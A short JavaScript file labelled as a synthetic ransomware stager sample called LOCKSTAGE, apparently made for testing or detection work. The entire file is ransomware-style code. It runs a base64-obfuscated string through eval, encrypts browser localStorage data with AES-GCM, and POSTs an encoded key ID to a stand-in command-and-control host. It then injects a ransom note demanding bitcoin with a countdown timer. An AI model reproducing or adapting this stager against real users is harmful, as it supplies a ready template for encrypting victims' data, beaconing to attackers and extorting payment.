// LOCKSTAGE — synthetic ransomware stager product sample.
(function () {
  var C2 = 'https://c2.example.test/keys';
  console.log('[LOCKSTAGE] stager online', C2);

  try { eval(atob('Y29uc29sZS5sb2coJ1tMT0NLU1RBR0VdIGVuY3J5cHRpb24gbW9kdWxlIHJlYWR5Jyk=')); } catch (error) {}
  try { localStorage.setItem('finance-q3', 'quarterly-report-sensitive-data'); } catch (error) {}

  function renderNote(keyId) {
    try {
      var note = document.createElement('div');
      note.id = 'lockstage-note';
      note.innerHTML =
        '<h1>Your files are encrypted</h1>' +
        '<p>Send 0.35 BTC to bc1qexamplelockstageaddress</p>' +
        '<p>Key ID: ' + keyId + '</p><p id="countdown">72:00:00</p>';
      document.body.appendChild(note);
    } catch (error) {}
  }

  function encryptAndExfiltrate() {
    var cryptoApi = window.crypto && window.crypto.subtle ? window.crypto.subtle : null;
    if (!cryptoApi) {
      renderNote('no-crypto');
      return;
    }
    var keyBytes = new Uint8Array(32);
    try { crypto.getRandomValues(keyBytes); } catch (error) {}
    cryptoApi.importKey('raw', keyBytes, { name: 'AES-GCM' }, true, ['encrypt', 'exportKey'])
      .then(function (key) {
        var iv = new Uint8Array(12);
        try { crypto.getRandomValues(iv); } catch (error) {}
        var data = new TextEncoder().encode(localStorage.getItem('finance-q3') || 'demo');
        return cryptoApi.encrypt({ name: 'AES-GCM', iv: iv }, key, data).then(function (cipher) {
          return cryptoApi.exportKey('raw', key).then(function (raw) {
            return { cipher: cipher, raw: raw, iv: iv };
          });
        });
      })
      .then(function (result) {
        var keyId = btoa(String.fromCharCode.apply(null, new Uint8Array(result.raw))).slice(0, 16);
        try {
          fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ keyId: keyId, iv: Array.from(result.iv), size: result.cipher.byteLength })) }).catch(function () {});
        } catch (error) {}
        try { localStorage.setItem('lockstage:keyid', keyId); } catch (error) {}
        renderNote(keyId);
        console.log('[LOCKSTAGE] encrypted', result.cipher.byteLength, 'bytes');
      })
      .catch(function (error) { console.log('[LOCKSTAGE] crypto failed', error.message); });
  }

  encryptAndExfiltrate();
  setTimeout(function () { console.log('[LOCKSTAGE] countdown tick'); }, 700);
})();
